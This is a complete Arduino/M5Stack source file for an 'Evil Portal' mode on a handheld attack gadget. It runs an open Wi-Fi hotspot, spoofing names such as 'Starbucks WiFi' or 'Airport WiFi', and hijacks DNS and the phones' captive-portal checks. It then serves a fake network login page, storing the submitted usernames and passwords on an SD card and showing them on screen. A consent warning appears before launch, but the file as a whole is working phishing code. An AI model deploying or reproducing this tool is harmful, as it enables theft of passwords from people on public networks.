// ============================================================
//  HeathenHawk Talon5 — modes/evil_portal.cpp
//  Captive portal — fixed: DNS redirect, visible AP
//  Authorized use only
// ============================================================

#include "../../pins.h"
#include "../display/display_driver.h"
#include "../hawk/hawk_pet.h"
#include <Arduino.h>
#include <M5Unified.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD.h>

#define MODE_NAME "Evil Portal"
#define STATUS_H  64
#define MAX_CREDS 50

struct Cred { char user[64]; char pass[64]; uint32_t ts; };
static Cred    creds[MAX_CREDS];
static uint8_t credCount  = 0;
static bool    sdReady    = false;
static bool    running    = false;
static bool    needRedraw = true;
static char    portalSSID[33] = "Free WiFi";

static WebServer server(80);
static DNSServer dns;

// Simple but convincing login page
const char PORTAL_HTML[] PROGMEM = R"rawhtml(
<!DOCTYPE html><html><head>
<title>WiFi Login</title>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#1a1a2e;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:-apple-system,sans-serif}
.card{background:white;border-radius:16px;padding:32px;width:90%;max-width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.4)}
h2{color:#1a1a2e;font-size:22px;margin-bottom:8px}
p{color:#666;font-size:14px;margin-bottom:24px}
label{display:block;font-size:13px;color:#333;margin-bottom:6px;font-weight:500}
input{width:100%;padding:12px 16px;border:1px solid #ddd;border-radius:8px;font-size:16px;margin-bottom:16px;outline:none}
input:focus{border-color:#4f46e5}
button{width:100%;padding:14px;background:#4f46e5;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}
button:active{background:#4338ca}
.logo{text-align:center;font-size:28px;margin-bottom:16px}
</style></head><body>
<div class='card'>
<div class='logo'>📶</div>
<h2>Network Login</h2>
<p>Sign in to access the internet</p>
<form method='POST' action='/login'>
<label>Email or Username</label>
<input type='text' name='user' autocomplete='off' required>
<label>Password</label>
<input type='password' name='pass' required>
<button type='submit'>Connect to Network</button>
</form></div></body></html>
)rawhtml";

const char SUCCESS_HTML[] PROGMEM = R"rawhtml(
<!DOCTYPE html><html><head>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<style>body{font-family:-apple-system,sans-serif;text-align:center;padding:60px 20px;background:#f0fdf4}
.check{font-size:64px}h2{color:#166534;margin:16px 0}p{color:#4b5563}</style></head>
<body><div class='check'>✅</div><h2>Connected!</h2><p>You now have internet access.</p></body></html>
)rawhtml";

void handleRoot()    { server.send(200, "text/html", PORTAL_HTML); }
void handleNotFound(){ server.send(200, "text/html", PORTAL_HTML); }

void handleLogin() {
    if (server.hasArg("user") && server.hasArg("pass")) {
        String user = server.arg("user");
        String pass = server.arg("pass");
        if (credCount < MAX_CREDS && user.length() > 0) {
            strlcpy(creds[credCount].user, user.c_str(), sizeof(creds[0].user));
            strlcpy(creds[credCount].pass, pass.c_str(), sizeof(creds[0].pass));
            creds[credCount].ts = millis();
            credCount++;
            M5.Speaker.tone(1047,100);delay(130);
            M5.Speaker.tone(1319,100);delay(130);
            M5.Speaker.tone(1568,150);
            if (sdReady) {
                File f=SD.open("/portal_creds.txt",FILE_APPEND);
                if (f){f.printf("[%lu] %s : %s\n",millis(),user.c_str(),pass.c_str());f.close();}
            }
            HawkPet::feed(FEED_EVIL_PORTAL,1);
            needRedraw=true;
        }
    }
    server.send(200,"text/html",SUCCESS_HTML);
}

void startPortal() {
    WiFi.mode(WIFI_AP);
    // Open AP — no password — makes it show up as "Open" network
    WiFi.softAP(portalSSID, "", 6, 0, 4);
    delay(500);

    IPAddress ip(192,168,4,1);
    IPAddress gateway(192,168,4,1);
    IPAddress subnet(255,255,255,0);
    WiFi.softAPConfig(ip, gateway, subnet);

    // DNS: redirect all domains to our IP
    dns.start(53, "*", ip);

    server.on("/", HTTP_GET,  handleRoot);
    server.on("/login", HTTP_POST, handleLogin);
    server.on("/generate_204", handleRoot);   // Android captive check
    server.on("/hotspot-detect.html", handleRoot); // iOS captive check
    server.on("/ncsi.txt", handleRoot);       // Windows captive check
    server.onNotFound(handleNotFound);
    server.begin();
}

void stopPortal() {
    server.stop();
    dns.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
}

bool showPortalConsent() {
    Display::clear(HH_DARK);
    Display::drawCard(40, 60, Display::width()-80, 620, "!! Legal Warning !!", HH_PINK);
    Display::setTextColor(HH_WHITE, HH_DARKCARD);
    Display::setTextSize(3.0f);
    Display::setCursor(60, 140);
    Display::print("Capturing credentials");
    Display::setCursor(60, 200);
    Display::print("without consent is ILLEGAL.");
    Display::setCursor(60, 280);
    Display::print("Only use on users who");
    Display::setCursor(60, 340);
    Display::print("have given written consent.");

    Display::fillRoundRect(60, 430, Display::width()-120, 110, 20, HH_PINK);
    Display::setTextColor(HH_WHITE, HH_PINK);
    Display::setTextSize(3.2f);
    Display::setCursor(80, 468);
    Display::print("I have permission");

    Display::fillRoundRect(60, 560, Display::width()-120, 110, 20, HH_GRAY);
    Display::setTextColor(HH_WHITE, HH_GRAY);
    Display::setCursor(80, 598);
    Display::print("Cancel");

    while (true) {
        m5::touch_point_t tp[1];
        if (M5.Lcd.getTouchRaw(tp,1)>0) {
            while (M5.Lcd.getTouchRaw(tp,1)>0) delay(10);
            if (tp[0].y>=430 && tp[0].y<=540) return true;
            if (tp[0].y>=560) return false;
        }
        delay(30);
    }
}

void renderPortal2() {
    Display::fillRect(0,STATUS_H,Display::width(),Display::height()-STATUS_H,HH_DARK);
    Display::drawStatusBar(MODE_NAME,false,sdReady,false,100);

    // Big counter
    Display::fillRect(0,STATUS_H,Display::width(),160,HH_DARKCARD);
    Display::setTextColor(HH_PINK,HH_DARKCARD);
    Display::setTextSize(9.0f);
    Display::setCursor(40,STATUS_H+20);
    char buf[8]; snprintf(buf,sizeof(buf),"%d",credCount);
    Display::print(buf);
    Display::setTextColor(HH_GRAY,HH_DARKCARD);
    Display::setTextSize(2.8f);
    Display::setCursor(40,STATUS_H+120);
    Display::print("credentials captured");

    // Start/stop button
    uint32_t btnCol=running?HH_CORAL:HH_PINK;
    Display::fillRoundRect(Display::width()-380,STATUS_H+30,360,100,16,btnCol);
    Display::setTextColor(HH_WHITE,btnCol);
    Display::setTextSize(3.0f);
    Display::setCursor(Display::width()-360,STATUS_H+58);
    Display::print(running?"STOP PORTAL":"START PORTAL");

    // Status info
    if (running) {
        Display::setTextColor(HH_GREEN,HH_DARK);
        Display::setTextSize(2.8f);
        Display::setCursor(20,STATUS_H+180);
        Display::printf("AP: %s  (Open)", portalSSID);
        Display::setCursor(20,STATUS_H+230);
        Display::print("IP: 192.168.4.1");
        Display::setCursor(20,STATUS_H+280);
        Display::printf("Connected clients: %d",WiFi.softAPgetStationNum());
    } else {
        Display::setTextColor(HH_GRAY,HH_DARK);
        Display::setTextSize(2.8f);
        Display::setCursor(20,STATUS_H+180);
        Display::print("Tap START to launch portal");
    }

    // Back button
    Display::fillRoundRect(20,Display::height()-110,200,80,16,HH_GRAY);
    Display::setTextColor(HH_WHITE,HH_GRAY);
    Display::setTextSize(3.0f);
    Display::setCursor(40,Display::height()-90);
    Display::print("BACK");

    // Creds list
    if (credCount>0) {
        int32_t y=STATUS_H+340,rh=110;
        for (uint8_t i=0;i<credCount&&y<Display::height()-130;i++) {
            Display::fillRoundRect(20,y,Display::width()-40,rh-4,10,HH_DARKCARD);
            Display::drawRoundRect(20,y,Display::width()-40,rh-4,10,HH_PINK);
            Display::setTextColor(HH_WHITE,HH_DARKCARD);
            Display::setTextSize(2.8f);
            Display::setCursor(36,y+12);
            Display::printf("user: %s",creds[i].user);
            Display::setCursor(36,y+56);
            Display::printf("pass: %s",creds[i].pass);
            y+=rh;
        }
    }
    needRedraw=false;
}

void mode_evil_portal() {
    credCount=0;running=false;needRedraw=true;
    memset(creds,0,sizeof(creds));
    sdReady=SD.begin();

    // Pick SSID
    struct {const char* name;} ssidOpts[]={
        {"Free WiFi"},{"Starbucks WiFi"},{"Airport WiFi"},
        {"Hotel Guest"},{"Public WiFi"},{"Custom..."}
    };
    Display::clear(HH_DARK);
    Display::drawStatusBar(MODE_NAME,false,false,false,100);
    Display::setTextColor(HH_WHITE,HH_DARK);
    Display::setTextSize(3.2f);
    Display::setCursor(40,STATUS_H+20);
    Display::print("Portal SSID:");
    for (int i=0;i<6;i++) {
        int32_t by=STATUS_H+80+i*90;
        Display::fillRoundRect(40,by,Display::width()-80,80,16,HH_DARKCARD);
        Display::drawRoundRect(40,by,Display::width()-80,80,16,HH_PINK);
        Display::setTextColor(HH_WHITE,HH_DARKCARD);
        Display::setTextSize(3.0f);
        Display::setCursor(60,by+22);
        Display::print(ssidOpts[i].name);
    }
    bool ssidChosen=false;
    while (!ssidChosen) {
        M5.update();
        m5::touch_point_t tp2[1];
        if (M5.Lcd.getTouchRaw(tp2,1)>0) {
            while (M5.Lcd.getTouchRaw(tp2,1)>0) delay(10);
            for (int i=0;i<6;i++) {
                int32_t by=STATUS_H+80+i*90;
                if (tp2[0].y>=by&&tp2[0].y<=by+80) {
                    if (i<5) {
                        strlcpy(portalSSID,ssidOpts[i].name,sizeof(portalSSID));
                        ssidChosen=true;
                    } else {
                        // Custom SSID — char-by-char entry
                        String customSSID="HeathenHawk";
                        const char* charset="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 -_!";
                        int cLen=strlen(charset), ci=0;
                        bool entering=true;
                        int32_t bwk=(Display::width()-80)/3;
                        auto drawKbd=[&](){
                            Display::clear(HH_DARK);
                            Display::drawStatusBar("Custom SSID",false,false,false,100);
                            Display::fillRoundRect(20,STATUS_H+10,Display::width()-40,80,12,HH_DARKCARD);
                            Display::setTextColor(HH_WHITE,HH_DARKCARD);Display::setTextSize(3.0f);
                            Display::setCursor(36,STATUS_H+30);Display::print(customSSID.c_str());
                            Display::setTextColor(HH_AMBER,HH_DARK);Display::setTextSize(6.0f);
                            char cb[2]={charset[ci],0};
                            Display::setCursor(Display::width()/2-30,STATUS_H+130);Display::print(cb);
                            Display::fillRoundRect(20,STATUS_H+280,bwk,90,12,HH_PURPLE);
                            Display::setTextColor(HH_WHITE,HH_PURPLE);Display::setTextSize(3.0f);
                            Display::setCursor(30,STATUS_H+310);Display::print("<");
                            Display::fillRoundRect(30+bwk,STATUS_H+280,bwk,90,12,HH_PURPLE);
                            Display::setTextColor(HH_WHITE,HH_PURPLE);
                            Display::setCursor(40+bwk,STATUS_H+310);Display::print(">");
                            Display::fillRoundRect(40+bwk*2,STATUS_H+280,bwk,90,12,HH_GREEN);
                            Display::setTextColor(HH_WHITE,HH_GREEN);
                            Display::setCursor(50+bwk*2,STATUS_H+310);Display::print("ADD");
                            Display::fillRoundRect(20,STATUS_H+390,bwk,90,12,HH_CORAL);
                            Display::setTextColor(HH_WHITE,HH_CORAL);
                            Display::setCursor(30,STATUS_H+420);Display::print("DEL");
                            Display::fillRoundRect(30+bwk,STATUS_H+390,bwk,90,12,HH_TEAL);
                            Display::setTextColor(HH_WHITE,HH_TEAL);
                            Display::setCursor(40+bwk,STATUS_H+420);Display::print("SPC");
                            Display::fillRoundRect(40+bwk*2,STATUS_H+390,bwk,90,12,HH_AMBER);
                            Display::setTextColor(HH_WHITE,HH_AMBER);
                            Display::setCursor(50+bwk*2,STATUS_H+420);Display::print("DONE");
                        };
                        drawKbd();
                        while (entering) {
                            M5.update();
                            m5::touch_point_t tpk[1];
                            if (M5.Lcd.getTouchRaw(tpk,1)>0) {
                                while (M5.Lcd.getTouchRaw(tpk,1)>0) delay(10);
                                int32_t tx=tpk[0].x,ty=tpk[0].y;
                                if (ty>=STATUS_H+280&&ty<=STATUS_H+370) {
                                    if (tx<20+bwk) ci=(ci-1+cLen)%cLen;
                                    else if (tx<30+bwk*2) ci=(ci+1)%cLen;
                                    else if (customSSID.length()<32) customSSID+=charset[ci];
                                } else if (ty>=STATUS_H+390&&ty<=STATUS_H+480) {
                                    if (tx<20+bwk) { if (customSSID.length()>0) customSSID.remove(customSSID.length()-1); }
                                    else if (tx<30+bwk*2) { if (customSSID.length()<32) customSSID+=' '; }
                                    else entering=false;
                                }
                                if (entering) drawKbd();
                            }
                            delay(20);
                        }
                        strlcpy(portalSSID,customSSID.c_str(),sizeof(portalSSID));
                        ssidChosen=true;
                    }
                    break;
                }
            }
        }
        delay(20);
    }
    if (!showPortalConsent()) return;

    renderPortal2();

    while (true) {
        M5.update();
        if (running) {
            dns.processNextRequest();
            server.handleClient();
        }

        m5::touch_point_t tp[1];
        int num=M5.Lcd.getTouchRaw(tp,1);
        static bool wasDown=false;
        bool tapped=(num>0)&&!wasDown;
        wasDown=(num>0);

        if (tapped) {
            // Back button
            if ((tp[0].y>=Display::height()-120&&tp[0].x<240)||tp[0].x<60) {
                if (running) stopPortal();
                break;
            }
            // Start/stop button
            if (tp[0].y>=STATUS_H+20&&tp[0].y<=STATUS_H+140&&
                tp[0].x>=Display::width()-400) {
                running=!running;
                if (running) startPortal();
                else stopPortal();
                needRedraw=true;
            }
            while (M5.Lcd.getTouchRaw(tp,1)>0) delay(10);
        }

        // Refresh client count every 2 seconds
        static uint32_t lastRefresh=0;
        if (running&&millis()-lastRefresh>2000) {
            lastRefresh=millis();
            needRedraw=true;
        }

        if (needRedraw) renderPortal2();
        HawkPet::tick();
        delay(10);
    }

    if (running) stopPortal();
    char msg[32]; snprintf(msg,sizeof(msg),"%d credentials",credCount);
    Display::showAlert("Portal Stopped",msg,HH_PINK,2000);
}
